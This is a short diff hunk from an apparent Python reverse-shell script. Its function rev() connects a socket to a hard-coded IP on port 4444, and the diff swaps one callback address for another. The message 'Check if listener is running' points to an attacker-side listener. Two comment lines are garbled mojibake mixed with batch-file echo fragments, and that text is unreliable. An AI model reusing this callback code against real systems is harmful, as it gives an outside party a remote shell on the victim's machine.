@@ -31,7 +31,7 @@ def rev():
 # yÈh yÈh            yÈh.^>^> ¦º5.bat^ >> ([µÛ]£.bat
 # yÈh yÈh            yÈh    def s_o^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
    try:
-       s.connect(('10.10.14.215', 4444))
+       s.connect(('10.21.8.114', 4444))
    except ConnectionRefusedError as e:
        print(f'refused ... Check if listener is running.')
        return
